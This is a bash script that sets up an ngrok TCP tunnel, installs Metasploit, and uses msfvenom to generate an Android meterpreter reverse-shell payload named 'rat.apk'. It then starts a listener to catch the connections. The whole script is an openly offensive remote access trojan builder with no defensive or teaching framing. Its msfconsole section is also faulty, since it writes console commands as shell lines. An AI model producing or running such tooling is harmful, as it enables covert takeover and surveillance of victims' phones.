#!/bin/bash

Green="\033[32m"
Red="\033[31m"

GreenBG="\033[42;37m"
RedBG="\033[41;37m"
Font="\033[0m"

OK="${Green}[OK]${Font}"
Error="${Red}[WRONG]${Font}"

random_num=$((RANDOM % 12 + 4))

camouflage="/$(head -n 10 /dev/urandom | md5sum | head -c ${random_num})/"

THREAD=$(grep 'processor' /proc/cpuinfo | sort -u | wc -l)

source '/etc/os-release'

VERSION=$(echo "${VERSION}" | awk -F "[()]" '{print $2}')

start_basic() {
  apt -y update
  apt -y install sudo
  apt -y update
}

is_root() {
  if [ 0 == $UID ]; then
    echo -e "${OK} ${GreenBG} The current user is the root user, enter the installation process ${Font}"
  else
    echo -e "${Error} ${RedBG} The current user is not the root user, please switch to the root user and execute the script again ${Font}"
    exit 1
  fi
}

ngrok_install(){
  apt -y install snapd
  apt -y snap install core
  wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
  tar -xvzf ngrok-v3-stable-linux-amd64.tgz
  read -rp "Enter Token(34E4sfs....):" Token
  echo -e "Your Token : ${Token}"
  ./ngrok config add-authtoken ${Token}
    echo -e "Please copy Forwarding url"
    sleep 3
  ./ngrok tcp 4444
}

metasploit_install(){
  apt -y install curl wget gnupg2 && apt -y install curl
  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
  chmod +x msfinstall
  ./msfinstall
  read -rp "Enter your Url Forwarding without https\tcp ! (tcp.f67d-tgs.ngrok.io):" url_f
   read -rp "Enter your Port Forwarding: " port_f
   msfvenom -p android/meterpreter/reverse_tcp LHOST=${url_f} LPORT=${port_f} -o rat.apk
  echo -e "Your rat is created in root"
}

msfconsole_config(){
  msfconsole
  use exploit/multi/handler
  set payload android/meterpreter/reverse_tcp
  set LHOST 127.0.0.1
  set LPORT 4444
  exploit
}


is_root
ngrok_install
metasploit_install
msfconsole_config
echo -e "Successfully"
